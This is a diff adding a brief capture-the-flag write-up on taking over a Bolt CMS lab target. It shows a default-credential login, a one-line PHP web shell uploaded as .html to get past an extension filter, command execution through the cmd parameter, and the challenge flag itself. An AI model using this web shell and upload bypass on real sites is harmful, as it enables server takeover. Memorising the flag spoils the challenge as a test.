@@ -1,0 +1,21 @@
+Opened the website at http://34.40.39.172:30580/ and viewed the page source to see it was built with Bolt CMS.
+
+Guessed the admin login page was at /bolt/login and visited it.
+
+Tried default credentials admin:password and successfully logged into the dashboard.
+
+Went to the file management tab and attempted to upload a PHP file named rce.php containing <?php echo system($_GET['cmd']); ?>.
+
+Got an error because .php was not an allowed extension; the allowed list included .html, .twig, .jpg, etc.
+
+Renamed the file to rce.html (allowed extension) and uploaded it successfully.
+
+Noted the file was stored under /files/ and accessed it at http://34.40.39.172:31430/files/rce.html
+
+Tested command execution by appending ?cmd=id, which returned uid=33(www-data) confirming RCE.
+
+Listed the current directory with ?cmd=ls%20-l and saw rce.html and index.html.
+
+Guessed the flag might be at /flag.txt (a common CTF location) and ran ?cmd=cat%20/flag.txt.
+
+Received the flag: CTF{b12e3b34c581d4f3c66c00cc7f8dabec8838dab0acf26c2cfbe2f7d291326f75}.
